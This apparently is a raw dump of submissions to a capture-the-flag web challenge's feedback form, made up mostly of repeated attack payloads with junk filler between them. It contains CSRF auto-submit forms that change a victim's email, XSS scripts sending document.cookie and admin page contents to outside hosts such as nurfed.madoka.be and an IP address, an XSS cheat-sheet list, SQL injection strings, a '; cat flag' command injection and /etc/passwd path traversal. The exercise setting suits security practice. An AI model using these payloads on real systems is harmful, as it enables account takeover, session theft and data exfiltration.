+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.khoiasd@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+<script>
+document.form1.submit();
+</script>
+
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.khoiasd@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+<script>
+document.form1.submit();
+</script>
+
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.khoiasd@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+<script>
+document.form1.submit();
+</script>
+
+<form name="form1" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.khoiasd@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+<script>
+document.form1.submit();
+</script>
+xxxxxxxxxxxxxxxxxxxxxxx
+ssssssss'asd
+<script>window.location = "http://lab01.uns.vn/get.php?s=" + document.cookie</script>
+<form name="form1" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input name="confirm" type="text" value="Change Email" />
+</form>
+<script>
+document.form1.submit();
+</script>
+<script>window.location = "http://lab01.uns.vn/get.php?s=" + document.cookie</script>
+ssssssss'asd
+<form name="csrf" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST">
+	<input type="hidden" name="email" value="nstung0911@gmail.com" />
+	<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">
+document.forms["csrf"].submit();
+</script>
+test kurama
+test kurama
+"
+feedback
+'"\
+\#
+Mario Castle
+ 
+feedback
+a' -- a
+a" -- a
+
+' or 1=1 -- a
+abc
+abc
+ghj
+cgt
+aaa
+bbb
+bbbb
+Feedback
+ccc
+cccc
+.
+
+ifconfig
+'; cat flag
+/etc/passwd
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+mario_xxxxxxxxxx
+
+adsf
+hi <script>document.location= "http://jok3rstylelogger.altervista.org/grab/grabmore.php?cookie=" + document.cookie;</script>
+khhk
+<script>alert("Hello")</script>
+mario
+alert("xxx")
+kurama
+>alert("xxx")
+<script>alert(f33db4ck)</script>
+<script>alert(123)</script>
+%3Cscript%3Ealert%28123%29%3C%2fscript%3E
+asdf
+<script>window.location="http://nurfed.madoka.be/test/cookie.php?c="+document.cookie</script>
+a
+1
+<script>window.location="http://nurfed.madoka.be/test/cookie.php?c="+document.cookie</script>
+a%3Cscript%3Ealert%28123%29%3C%2fscript%3E
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;</script>
+adfasdf
+asd
+asd
+<?php phpinfo();?
+2q0nfq0oqo89gr2m91tgo19cp4
+a<script>alert(document.cookie)</script>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<script>window.location="http://nurfed.madoka.be/test/cookie.php?c="+document.body</script>
+<script>var xmlHttp = null;xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "http://google.it", false ); xmlHttp.send( null );return xmlHttp.responseText;</script>
+<script>var xmlHttp = null;xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "http://google.it", false ); xmlHttp.send( null );return xmlHttp.responseText;</script>
+<script>var xmlHttp = null;xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "http://google.it", false ); xmlHttp.send( null );window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;</script>
+<script>alert(/xss/)</script>
+Hello
+aaaaaa
+<h1>trideptrai</h1>
+1' or '1'='1
+dasdas d das dsa d
+Feedback to me.
+dasd as d
+dsadsad
+<script>window.location.assign('http://google.com.vn/')</script>
+<script>window.location.assign('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change&email=a@yopmail.com')</script>
+dsa dsadsva
+1' or '1'='1
+F44db4ck
+<script>window.location.assign('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/admin')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/admin/')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change')</script>
+<script>window.location.assign(http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change')</script>
+<script type="text/javascript">
+var xhReq = new XMLHttpRequest();
+xhReq.open("GET", "http://184.72.34.238/?" + document.cookie, false);
+xhReq.send(null);
+</script>
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script type="text/javascript">
+var xhReq = new XMLHttpRequest();
+xhReq.open("GET", "http://184.72.34.238/?" + document.cookie, false);
+xhReq.send(null);
+</script>
+<script>document.forms[0].submit();</script>
+Nothing
+1234
+vbncvbncn
+<script>
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email");
+</script>
+<script>
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email");
+document.write(xmlhttp.responseText);
+</script>
+<script>
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email");
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlhttp.responseText;
+</script>
+<script>
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email");
+
+</script>
+<script>
+var xmlHttp = null;
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email");
+</script
+<script>
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+</script>
+<script>
+var xmlHttp = null;
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+</script>
+<script>
+var xmlHttp = null;
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",false);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+</script
+<script>
+var xmlHttp = null;
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+ xmlHttp.responseText;
+</script
+
+<—
+<scr
+<script>
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email");
+</script>
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xmlHttp.send( "password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email" );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", true );
+	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xmlHttp.send( "password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email" );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", true );
+	xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xmlHttp.send( "password=&newpassword=&email=danznn562%40gmail.it&confirm=Change+Email" );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", true );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", true );
+	xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+	xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script
+<script>
+	var xmlHttp = null;xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+	xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+asdas das
+d as
+das
+d
+as
+das
+d
+as
+das
+d
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", true);
+xmlHttp.send(null);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script
+fack yeah
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xmlHttp.send(null);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xmlHttp.send(null);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+escape(xmlHttp.responseText);
+</script
+
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xmlHttp.send(null);
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+"aaa";
+</script>
+aggagagag
+Do you have any feedback for us?
+<scrpit>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+xhr.send("email=trungdl.one@gmail.com");
+</script>
+Do you have any feedback for us?
+<script type="text/javascript">
+var xhReq = new XMLHttpRequest();
+xhReq.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", false);
+xhReq.send("password=&newpassword=&email=dikei%40mailinator.com&confirm=Change+Email");
+
+var xhReq2 = new XMLHttpRequest();
+xhReq2.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xhReq.send("username=&password=&email=dikei%40mailinator.com&confirm=Forgot%3F");
+
+</script>
+<script type="text/javascript">
+var xhReq = new XMLHttpRequest();
+xhReq.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", false);
+xhReq.send("password=&newpassword=&email=dikei%40mailinator.com&confirm=Change+Email");
+
+var xhReq2 = new XMLHttpRequest();
+xhReq2.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xhReq2.send("username=&password=&email=dikei%40mailinator.com&confirm=Forgot%3F");
+
+var xhReq3 = new XMLHttpRequest();
+xhReq3.open("POST", "http://184.72.34.238", false);
+xhReq3.send(null);
+
+
+</script>
+
+f33db4ck
+<html>
+<title>Mario Castle Login System</title>
+<link rel="stylesheet" href="css/gumby.css">
+	<body onload="document.formsub.confirmemail()">
+
+<div class="row">
+	<h1 class="lead" style="color: #f4902a">Mario Castle</h1>
+	<img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /><br /><br />
+		<div class="fourteen columns">
+		
+			<ul>
+				<form method="POST" action="?act=change" name="formsub">
+				<h3>EHLO, <font color='#f4902a'>qwerty1234</font> :)</h3>
+					<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+					<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+					<li class="field"><input type="email" class="email input" name="email" value="danznn562@gmail.com"/></li>
+					<h6>If you want to change email, you just need enter the another one ;)</h6>
+					<input class="button button-orange" name="confirm" type="submit" value="Change Password" />
+					<input class="button button-orange" name="confirmemail" type="submit" value="Change Email" />
+					<input class="button button-orange" name="logout" type="submit" value="Logout" />
+				</form>
